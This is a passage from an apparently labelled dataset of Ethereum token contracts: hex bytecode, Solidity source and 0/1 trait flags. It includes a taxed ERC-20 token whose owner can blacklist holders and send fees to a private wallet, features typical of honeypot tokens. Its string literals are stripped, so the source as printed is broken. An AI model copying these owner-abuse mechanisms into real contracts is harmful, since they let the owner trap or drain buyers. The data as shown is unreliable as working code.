565b612b8091906138df565b905060155460175482612b9391906138c0565b612b9d91906138df565b60206000828254612bae9190613901565b9091555050601554601654612bc390836138c0565b612bcd91906138df565b601f6000828254612bde9190613901565b9091555050601554601854612bf390836138c0565b612bfd91906138df565b60216000828254612c0e9190613901565b9091555050601554601954612c2390836138c0565b612c2d91906138df565b60226000828254612c3e9190613901565b90915550612e429050565b6001600160a01b03861660009081526025602052604090205460ff168015612c7357506000601a54115b15612d35576064601a5486612c8891906138c0565b612c9291906138df565b9050601a54601c5482612ca591906138c0565b612caf91906138df565b60206000828254612cc09190613901565b9091555050601a54601b54612cd590836138c0565b612cdf91906138df565b601f6000828254612cf09190613901565b9091555050601a54601d54612d0590836138c0565b612d0f91906138df565b60216000828254612d209190613901565b9091555050601a54601e54612c2390836138c0565b6001600160a01b03871660009081526025602052604090205460ff168015612d5f57506000601554115b15612e4257606460155486612d7491906138c0565b612d7e91906138df565b905060155460175482612d9191906138c0565b612d9b91906138df565b60206000828254612dac9190613901565b9091555050601554601654612dc190836138c0565b612dcb91906138df565b601f6000828254612ddc9190613901565b9091555050601554601854612df190836138c0565b612dfb91906138df565b60216000828254612e0c9190613901565b9091555050601554601954612e2190836138c0565b612e2b91906138df565b60226000828254612e3c9190613901565b90915550505b8015612e5357612e538730836130e1565b612e5d8186613a6d565b94505b612e6b8787876130e1565b50505050505050565b6000602254118015612e905750602254612e8d3061112a565b10155b15612ea157612ea130602254613236565b60006022819055612eb13061112a565b90506000602154601f54602054612ec89190613901565b612ed29190613901565b9050811580612edf575080155b15612ee8575050565b600b54612ef69060146138c0565b821115612f0e57600b54612f0b9060146138c0565b91505b60008060028360205486612f2291906138c0565b612f2c91906138df565b612f3691906138df565b9050612f4a612f458286613a6d565b613360565b60205447908190600090612f60906002906138df565b612f6a9087613a6d565b601f54612f7790856138c0565b612f8191906138df565b905060006002602054612f9491906138df565b612f9e9088613a6d565b602154612fab90866138c0565b612fb591906138df565b9050612fc18183613901565b612fcb9084613a6d565b60006020819055601f819055602181905560225592508415801590612ff05750600083115b15612fff57612fff85846134ba565b600d546040516001600160a01b03909116908290600081818185875af1925050503d806000811461304c576040519150601f19603f3d011682016040523d82523d6000602084013e613051565b606091505b5050600c546040519197506001600160a01b0316904790600081818185875af1925050503d80600081146130a1576040519150601f19603f3d011682016040523d82523d6000602084013e6130a6565b606091505b5050505050505050505050565b6001600160a01b0382166000908152602560205260409020805460ff191682151517905561168f828261356c565b6001600160a01b0383166131075760405162461bcd60e51b8152600401610c4a906139e5565b6001600160a01b03821661312d5760405162461bcd60e51b8152600401610c4a90613a2a565b6001600160a01b038316600090815260208190526040902054818110156131a55760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b6064820152608401610c4a565b6001600160a01b038085166000908152602081905260408082208585039055918516815290812080548492906131dc908490613901565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161322891815260200190565b60405180910390a350505050565b6001600160a01b0382166132965760405162461bcd60e51b815260206004820152602160248201527f45524332303a206275726e2066726f6d20746865207a65726f206164647265736044820152607360f81b6064820152608401610c4a565b6001600160a01b0382166000908152602081905260409020548181101561330a5760405162461bcd60e51b815260206004820152602260248201527f45524332303a206275726e20616d6f756e7420657863656564732062616c616e604482015261636560f01b6064820152608401610c4a565b6001600160a01b0383166000818152602081815260408083208686039055600280548790039055518581529192917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9101612332565b60408051600280825260608201835260009260208301908036833701905050905030816000815181106133955761339561387b565b6001600160a01b03928316602091820292909201810191909152600954604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156133ee573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190613412919061394f565b816001815181106134255761342561387b565b6001600160a01b03928316602091820292909201015260095461344b913091168461221a565b60095460405163791ac94760e01b81526001600160a01b039091169063791ac94790613484908590600090869030904290600401613a84565b600060405180830381600087803b15801561349e57600080fd5b505af11580156134b2573d6000803e3d6000fd5b505050505050565b6009546134d29030906001600160a01b03168461221a565b60095460405163f305d71960e01b815230600482015260248101849052600060448201819052606482015261dead60848201524260a48201526001600160a01b039091169063f305d71990839060c40160606040518083038185885af1158015613540573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906135659190613ac0565b5050505050565b6001600160a01b038216600081815260246020908152604091829020805460ff19168515159081179091558251938452908301527f6b4f1be9103e6cbcd38ca4a922334f2c3109b260130a6676a987f94088fd6746910161220e565b600060208083528351808285015260005b818110156135f5578581018301518582016040015282016135d9565b81811115613607576000604083870101525b50601f01601f1916929092016040019392505050565b6001600160a01b038116811461363257600080fd5b50565b6000806040838503121561364857600080fd5b82356136538161361d565b946020939093013593505050565b60006020828403121561367357600080fd5b813561367e8161361d565b9392505050565b801515811461363257600080fd5b6000806000604084860312156136a857600080fd5b833567ffffffffffffffff808211156136c057600080fd5b818601915086601f8301126136d457600080fd5b8135818111156136e357600080fd5b8760208260051b85010111156136f857600080fd5b6020928301955093505084013561370e81613685565b809150509250925092565b60008060006060848603121561372e57600080fd5b83356137398161361d565b925060208401356137498161361d565b929592945050506040919091013590565b60006020828403121561376c57600080fd5b5035919050565b6000806000806080858703121561378957600080fd5b5050823594602084013594506040840135936060013592509050565b600080604083850312156137b857600080fd5b82356137c38161361d565b915060208301356137d381613685565b809150509250929050565b600080604083850312156137f157600080fd5b82356137fc8161361d565b915060208301356137d38161361d565b600181811c9082168061382057607f821691505b60208210810361384057634e487b7160e01b600052602260045260246000fd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052601160045260246000fd5b6000600182016138b9576138b9613891565b5060010190565b60008160001904831182151516156138da576138da613891565b500290565b6000826138fc57634e487b7160e01b600052601260045260246000fd5b500490565b6000821982111561391457613914613891565b500190565b60006020828403121561392b57600080fd5b5051919050565b60006020828403121561394457600080fd5b815161367e81613685565b60006020828403121561396157600080fd5b815161367e8161361d565b600081518084526020808501945080840160005b838110156139a55781516001600160a01b031687529582019590820190600101613980565b509495945050505050565b8481526080602082015260006139c9608083018661396c565b6001600160a01b03949094166040830152506060015292915050565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b600082821015613a7f57613a7f613891565b500390565b85815284602082015260a060408201526000613aa360a083018661396c565b6001600160a01b0394909416606083015250608001529392505050565b600080600060608486031215613ad557600080fd5b835192506020840151915060408401519050925092509256fea264697066735822122087e06182ba4552bcdf5abcd7165bafd7ecafdcd32edef3b9f807d53644d14ce364736f6c634300080f0033,0,0,0,0,0,0,0,1,0,0,1,0,1,1,1,0,0
"pragma solidity 0.8.19;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }}contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }}interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);}contract Arbitrum2 is Context, IERC20, Ownable { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; mapping (address => bool) private _isExcludedFromFee; mapping (address => bool) private bots; mapping(address => uint256) private _holderLastTransferTimestamp; bool public transferDelayEnabled = true; address payable private _taxWallet; uint256 private _initialBuyTax=15; uint256 private _initialSellTax=20; uint256 private _finalBuyTax=5; uint256 private _finalSellTax=5; uint256 private _reduceBuyTaxAt=15; uint256 private _reduceSellTaxAt=20; uint256 private _preventSwapBefore=20; uint256 private _buyCount=0; uint8 private constant _decimals = 9; uint256 private constant _tTotal = 100000000 * 10**_decimals; string private constant _name = unicode; string private constant _symbol = unicode; uint256 public _maxTxAmount = 2000000 * 10**_decimals; uint256 public _maxWalletSize = 2000000 * 10**_decimals; uint256 public _taxSwapThreshold= 2000000 * 10**_decimals; uint256 public _maxTaxSwap= 2000000 * 10**_decimals; IUniswapV2Router02 private uniswapV2Router; address private uniswapV2Pair; bool private tradingOpen; bool private inSwap = false; bool private swapEnabled = false; event MaxTxAmountUpdated(uint _maxTxAmount); modifier lockTheSwap { inSwap = true; _; inSwap = false; } constructor () { _taxWallet = payable(_msgSender()); _balances[_msgSender()] = _tTotal; _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_taxWallet] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function _approve(address owner, address spender, uint256 amount) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer(address from, address to, uint256 amount) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); uint256 taxAmount=0; if (from != owner() && to != owner()) { require(!bots[from] && !bots[to]); taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100); if (transferDelayEnabled) { if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { require( _holderLastTransferTimestamp[tx.origin] < block.number, ); _holderLastTransferTimestamp[tx.origin] = block.number; } } if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) { require(amount <= _maxTxAmount, ); require(balanceOf(to) + amount <= _maxWalletSize, ); _buyCount++; } if(to == uniswapV2Pair && from!= address(this) ){ taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100); } uint256 contractTokenBalance = balanceOf(address(this)); if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) { swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap))); uint256 contractETHBalance = address(this).balance; if(contractETHBalance > 0) { sendETHToFee(address(this).balance); } } } if(taxAmount>0){ _balances[address(this)]=_balances[address(this)].add(taxAmount); emit Transfer(from, address(this),taxAmount); } _balances[from]=_balances[from].sub(amount); _balances[to]=_balances[to].add(amount.sub(taxAmount)); emit Transfer(from, to, amount.sub(taxAmount)); } function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a; } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function removeLimits() external onlyOwner{ _maxTxAmount = _tTotal; _maxWalletSize=_tTotal; transferDelayEnabled=false; emit MaxTxAmountUpdated(_tTotal); } function sendETHToFee(uint256 amount) private { _taxWallet.transfer(amount); } function addBots(address[] memory bots_) public onlyOwner { for (uint i = 0; i < bots_.length; i++) { bots[bots_[i]] = true; } } function delBots(address[] memory notbot) public onlyOwner { for (uint i = 0; i < notbot.length; i++) { bots[notbot[i]] = false; } } function isBot(address a) public view returns (bool){ return bots[a]; } function openTrading() external onlyOwner() { require(!tradingOpen,); uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); _approve(address(this), address(uniswapV2Router), _tTotal); uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp); IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); swapEnabled = true; tradingOpen = true; } function reduceFee(uint256 _newFee) external{ require(_msgSender()==_taxWallet); require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax); _finalBuyTax=_newFee; _finalSellTax=_newFee; } receive() external payable {} function manualSwap() external { require(_msgSender()==_taxWallet); uint256 tokenBalance=balanceOf(address(this)); if(tokenBalance>0){ swapTokensForEth(tokenBalance); } uint256 ethBalance=address(this).balance; if(ethBalance>0){ sendETHToFee(ethBalance); } }}",0x6080604052600436106101445760003560e01c8063751039fc116100b6578063bf474bed1161006f578063bf474bed1461037d578063c876d0b914610393578063c9567bf9146103ad578063d34628cc146103c2578063dd62ed3e146103e2578063ec1f3f631461042857600080fd5b8063751039fc146102f45780637d1db4a5146103095780638da5cb5b1461031f5780638f9a55c01461034757806395d89b4114610150578063a9059cbb1461035d57600080fd5b8063313ce56711610108578063313ce5671461021d57806331c2d847146102395780633bbac5791461025b57806351bc3c851461029457806370a08231146102a9578063715018a6146102df57600080fd5b806306fdde0314610150578063095ea7b3146101945780630faee56f146101c457806318160ddd146101e857806323b872dd146101fd57600080fd5b3661014b57005b600080fd5b34801561015c57600080fd5b50604080518082018252600c81526b0417262697472756d20322e360a41b6020820152905161018b919061169d565b60405180910390f35b3480156101a057600080fd5b506101b46101af366004611713565b610448565b604051901515815260200161018b565b3480156101d057600080fd5b506101da60125481565b60405190815260200161018b565b3480156101f457600080fd5b506101da61045f565b34801561020957600080fd5b506101b461021836600461173f565b610480565b34801561022957600080fd5b506040516009815260200161018b565b34801561024557600080fd5b50610259610254366004611796565b6104e9565b005b34801561026757600080fd5b506101b461027636600461185b565b6001600160a01b031660009081526004602052604090205460ff1690565b3480156102a057600080fd5b50610259610588565b3480156102b557600080fd5b506101da6102c436600461185b565b6001600160a01b031660009081526001602052604090205490565b3480156102eb57600080fd5b506102596105dc565b34801561030057600080fd5b50610259610650565b34801561031557600080fd5b506101da600f5481565b34801561032b57600080fd5b506000546040516001600160a01b03909116815260200161018b565b34801561035357600080fd5b506101da60105481565b34801561036957600080fd5b506101b4610378366004611713565b61070c565b34801561038957600080fd5b506101da60115481565b34801561039f57600080fd5b506006546101b49060ff1681565b3480156103b957600080fd5b50610259610719565b3480156103ce57600080fd5b506102596103dd366004611796565b610ad5565b3480156103ee57600080fd5b506101da6103fd366004611878565b6001600160a01b03918216600090815260026020908152604080832093909416825291909152205490565b34801561043457600080fd5b506102596104433660046118b1565b610b67565b6000610455338484610bb3565b5060015b92915050565b600061046d6009600a6119c4565b61047b906305f5e1006119d3565b905090565b600061048d848484610cd7565b6104df84336104da85604051806060016040528060288152602001611b75602891396001600160a01b038a16600090815260026020908152604080832033845290915290205491906112fc565b610bb3565b5060019392505050565b6000546001600160a01b0316331461051c5760405162461bcd60e51b8152600401610513906119ea565b60405180910390fd5b60005b81518110156105845760006004600084848151811061054057610540611a1f565b6020908102919091018101516001600160a01b03168252810191909152604001600020805460ff19169115159190911790558061057c81611a35565b91505061051f565b5050565b60065461010090046001600160a01b0316336001600160a01b0316146105ad57600080fd5b3060009081526001602052604090205480156105cc576105cc81611336565b47801561058457610584816114b0565b6000546001600160a01b031633146106065760405162461bcd60e51b8152600401610513906119ea565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b6000546001600160a01b0316331461067a5760405162461bcd60e51b8152600401610513906119ea565b6106866009600a6119c4565b610694906305f5e1006119d3565b600f556106a36009600a6119c4565b6106b1906305f5e1006119d3565b6010556006805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf6106eb6009600a6119c4565b6106f9906305f5e1006119d3565b60405190815260200160405180910390a1565b6000610455338484610cd7565b6000546001600160a01b031633146107435760405162461bcd60e51b8152600401610513906119ea565b601454600160a01b900460ff161561079d5760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610513565b601380546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556107e69030906107d86009600a6119c4565b6104da906305f5e1006119d3565b601360009054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610839573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061085d9190611a4e565b6001600160a01b031663c9c6539630601360009054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156108bf573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108e39190611a4e565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303816000875af1158015610930573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109549190611a4e565b601480546001600160a01b039283166001600160a01b03199091161790556013541663f305d719473061099c816001600160a01b031660009081526001602052604090205490565b6000806109b16000546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610a19573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190610a3e9190611a6b565b505060145460135460405163095ea7b360e01b81526001600160a01b03918216600482015260001960248201529116915063095ea7b3906044016020604051808303816000875af1158015610a97573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610abb9190611a99565b506014805462ff00ff60a01b19166201000160a01b179055565b6000546001600160a01b03163314610aff5760405162461bcd60e51b8152600401610513906119ea565b60005b815181101561058457600160046000848481518110610b2357610b23611a1f565b6020908102919091018101516001600160a01b03168252810191909152604001600020805460ff191691151591909117905580610b5f81611a35565b915050610b02565b60065461010090046001600160a01b0316336001600160a01b031614610b8c57600080fd5b6009548111158015610ba05750600a548111155b610ba957600080fd5b6009819055600a55565b6001600160a01b038316610c155760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610513565b6001600160a01b038216610c765760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610513565b6001600160a01b0383811660008181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610d3b5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610513565b6001600160a01b038216610d9d5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610513565b60008111610dff5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610513565b600080546001600160a01b03858116911614801590610e2c57506000546001600160a01b03848116911614155b156111b9576001600160a01b03841660009081526004602052604090205460ff16158015610e7357506001600160a01b03831660009081526004602052604090205460ff16155b610e7c57600080fd5b610ea86064610ea2600b54600e5411610e9757600754610e9b565b6009545b85906114ee565b90611577565b60065490915060ff1615610f90576013546001600160a01b03848116911614801590610ee257506014546001600160a01b03848116911614155b15610f9057326000908152600560205260409020544311610f7d5760405162461bcd60e51b815260206004820152604960248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b6064820152681030b63637bbb2b21760b91b608482015260a401610513565b3260009081526005602052604090204390555b6014546001600160a01b038581169116148015610fbb57506013546001600160a01b03848116911614155b8015610fe057506001600160a01b03831660009081526003602052604090205460ff16155b156110c857600f548211156110375760405162461bcd60e51b815260206004820152601960248201527f4578636565647320746865205f6d61785478416d6f756e742e000000000000006044820152606401610513565b6010548261105a856001600160a01b031660009081526001602052604090205490565b6110649190611abb565b11156110b25760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e0000000000006044820152606401610513565b600e80549060006110c283611a35565b91905055505b6014546001600160a01b0384811691161480156110ee57506001600160a01b0384163014155b1561111b576111186064610ea2600c54600e541161110e57600854610e9b565b600a5485906114ee565b90505b30600090815260016020526040902054601454600160a81b900460ff1615801561115257506014546001600160a01b038581169116145b80156111675750601454600160b01b900460ff165b8015611174575060115481115b80156111835750600d54600e54115b156111b7576111a56111a08461119b846012546115b9565b6115b9565b611336565b4780156111b5576111b5476114b0565b505b505b801561123357306000908152600160205260409020546111d990826115ce565b30600081815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9061122a9085815260200190565b60405180910390a35b6001600160a01b038416600090815260016020526040902054611256908361162d565b6001600160a01b03851660009081526001602052604090205561129b61127c838361162d565b6001600160a01b038516600090815260016020526040902054906115ce565b6001600160a01b0380851660008181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6112e5858561162d565b60405190815260200160405180910390a350505050565b600081848411156113205760405162461bcd60e51b8152600401610513919061169d565b50600061132d8486611ace565b95945050505050565b6014805460ff60a81b1916600160a81b179055604080516002808252606082018352600092602083019080368337019050509050308160008151811061137e5761137e611a1f565b6001600160a01b03928316602091820292909201810191909152601354604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156113d7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113fb9190611a4e565b8160018151811061140e5761140e611a1f565b6001600160a01b0392831660209182029290920101526013546114349130911684610bb3565b60135460405163791ac94760e01b81526001600160a01b039091169063791ac9479061146d908590600090869030904290600401611ae1565b600060405180830381600087803b15801561148757600080fd5b505af115801561149b573d6000803e3d6000fd5b50506014805460ff60a81b1916905550505050565b6006546040516101009091046001600160a01b0316906108fc8315029083906000818181858888f19350505050158015610584573d6000803e3d6000fd5b60008260000361150057506000610459565b600061150c83856119d3565b9050826115198583611b52565b146115705760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610513565b9392505050565b600061157083836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525061166f565b60008183116115c85782611570565b50919050565b6000806115db8385611abb565b9050838110156115705760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610513565b600061157083836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506112fc565b600081836116905760405162461bcd60e51b8152600401610513919061169d565b50600061132d8486611b52565b600060208083528351808285015260005b818110156116ca578581018301518582016040015282016116ae565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461170057600080fd5b50565b803561170e816116eb565b919050565b6000806040838503121561172657600080fd5b8235611731816116eb565b946020939093013593505050565b60008060006060848603121561175457600080fd5b833561175f816116eb565b9250602084013561176f816116eb565b929592945050506040919091013590565b634e487b7160e01b600052604160045260246000fd5b600060208083850312156117a957600080fd5b823567ffffffffffffffff808211156117c157600080fd5b818501915085601f8301126117d557600080fd5b8135818111156117e7576117e7611780565b8060051b604051601f19603f8301168101818110858211171561180c5761180c611780565b60405291825284820192508381018501918883111561182a57600080fd5b938501935b8285101561184f5761184085611703565b8452938501939285019261182f565b98975050505050505050565b60006020828403121561186d57600080fd5b8135611570816116eb565b6000806040838503121561188b57600080fd5b8235611896816116eb565b915060208301356118a6816116eb565b809150509250929050565b6000602082840312156118c357600080fd5b5035919050565b634e487b7160e01b600052601160045260246000fd5b600181815b8085111561191b578160001904821115611901576119016118ca565b8085161561190e57918102915b93841c93908002906118e5565b509250929050565b60008261193257506001610459565b8161193f57506000610459565b8160018114611955576002811461195f5761197b565b6001915050610459565b60ff841115611970576119706118ca565b50506001821b610459565b5060208310610133831016604e8410600b841016171561199e575081810a610459565b6119a883836118e0565b80600019048211156119bc576119bc6118ca565b029392505050565b600061157060ff841683611923565b8082028115828204841417610459576104596118ca565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052603260045260246000fd5b600060018201611a4757611a476118ca565b5060010190565b600060208284031215611a6057600080fd5b8151611570816116eb565b600080600060608486031215611a8057600080fd5b8351925060208401519150604084015190509250925092565b600060208284031215611aab57600080fd5b8151801515811461157057600080fd5b80820180821115610459576104596118ca565b81810381811115610459576104596118ca565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015611b315784516001600160a01b031683529383019391830191600101611b0c565b50506001600160a01b03969096166060850152505050608001529392505050565b600082611b6f57634e487b7160e01b600052601260045260246000fd5b50049056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212200622524339376ce4eefd98af11e2613173873eb6ee3db0b071bd375c77eb9f6f64736f6c63430008130033,0,0,0,1,0,0,0,1,0,0,1,0,1,0,1,0,0
"pragma solidity 0.8.9;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { this; return msg.data; }}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}library SafeMathInt { int256 private constant MIN_INT256 = int256(1) << 255; int256 private constant MAX_INT256 = ~(int256(1) << 255); function mul(int256 a, int256 b) internal pure returns (int256) { int256 c = a * b; require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256)); require((b == 0) || (c / b == a)); return c; } function div(int256 a, int256 b) internal pure returns (int256) { require(b != -1 || a != MIN_INT256); return a / b; } function sub(int256 a, int256 b) internal pure returns (int256) { int256 c = a - b; require((b >= 0 && c <= a) || (b < 0 && c > a)); return c; } function add(int256 a, int256 b) internal pure returns (int256) { int256 c = a + b; require((b >= 0 && c >= a) || (b < 0 && c < a)); return c; } function abs(int256 a) internal pure returns (int256) { require(a != MIN_INT256); return a < 0 ? -a : a; } function toUint256Safe(int256 a) internal pure returns (uint256) { require(a >= 0); return uint256(a); }}library SafeMathUint { function toInt256Safe(uint256 a) internal pure returns (int256) { int256 b = int256(a); require(b >= 0); return b; }}interface IUniswapV2Pair { event Approval(address indexed owner, address indexed spender, uint value); event Transfer(address indexed from, address indexed to, uint value); function name() external pure returns (string memory); function symbol() external pure returns (string memory); function decimals() external pure returns (uint8); function totalSupply() external view returns (uint); function balanceOf(address owner) external view returns (uint); function allowance(address owner, address spender) external view returns (uint); function approve(address spender, uint value) external returns (bool); function transfer(address to, uint value) external returns (bool); function transferFrom(address from, address to, uint value) external returns (bool); function DOMAIN_SEPARATOR() external view returns (bytes32); function PERMIT_TYPEHASH() external pure returns (bytes32); function nonces(address owner) external view returns (uint); function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external; event Mint(address indexed sender, uint amount0, uint amount1); event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to ); event Sync(uint112 